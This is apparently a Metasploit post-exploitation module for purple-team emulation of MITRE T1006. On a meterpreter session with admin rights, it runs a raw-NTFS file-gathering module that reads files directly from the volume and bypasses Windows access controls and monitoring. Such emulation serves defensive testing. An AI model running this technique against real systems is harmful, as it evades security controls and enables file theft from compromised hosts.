##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "File System Logical Offsets (T1006) Windows - Purple Team",
      'Description'          => %q{
        Defense Evasion:
        Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write
        files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access
        controls as well as file system monitoring tools.

        The file_path is case sensitive.
          Pulling files from C:\Windows\System32 does not currently work. Not sure why, but it works enough for a POC.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1006' ] ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
        ))
    register_options(
    [
      OptString.new("MODULE", [ true, "Module to execute", 'post/windows/gather/file_from_raw_ntfs']),
      OptString.new('FILE_PATH', [true, 'The FILE_PATH to retreive from the Volume raw device (case sensitive)', nil])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      payload = datastore['PAYLOAD']
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.datastore['FILE_PATH'] = datastore['FILE_PATH']
      framework_mod.run_simple(
          'LocalInput'    => self.user_input,
          'LocalOutput'   => self.user_output,
          'Quiet'       => false,
          'Payload'   => payload,
          'RunAsJob'  => true)
  end

  def run
    return 0 if session.type != "meterpreter"

    if not is_admin?
      fail_with(Failure::NoAccess, "The current session does not have administrative rights. Re-run the module as an administrator.")
    end

    mod = datastore['MODULE']

    begin
        print_status("Executing '#{mod}' on #{session.inspect}")
        run_module(mod)
        print_good("Successful execution!")
    rescue ::Exception => e
        print_error("Unable to execute: #{e.message}")
        return
    end
  end
end
